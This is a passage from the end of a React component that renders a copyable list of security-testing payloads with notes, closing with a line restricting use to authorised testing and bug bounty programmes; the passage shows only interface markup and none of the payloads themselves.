                              className="inline-flex cursor-pointer items-center gap-1 border-2 border-fg px-2 py-0.5 font-mono text-2xs uppercase transition-colors hover:bg-fg hover:text-surface"
                              style={mono}
                              data-cursor-label="Copy payload"
                            >
                              <FontAwesomeIcon icon={copied ? faCheck : faCopy} className="text-[10px]" />
                              copy
                            </button>
                          </div>
                          <pre className="overflow-x-auto whitespace-pre-wrap break-all p-3 font-mono text-xs leading-relaxed text-fg" style={mono}>
                            {apply(payload.code)}
                          </pre>
                          <p className="border-t border-fg-muted/15 px-3 py-2 font-sans text-xs leading-snug text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontSans }}>
                            {payload.note}
                          </p>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          <p className="mt-10 font-mono text-2xs uppercase text-fg-muted" style={mono}>
            For authorised security testing and bug bounty programmes only.
          </p>
        </section>
      </main>
    </>
  );
}
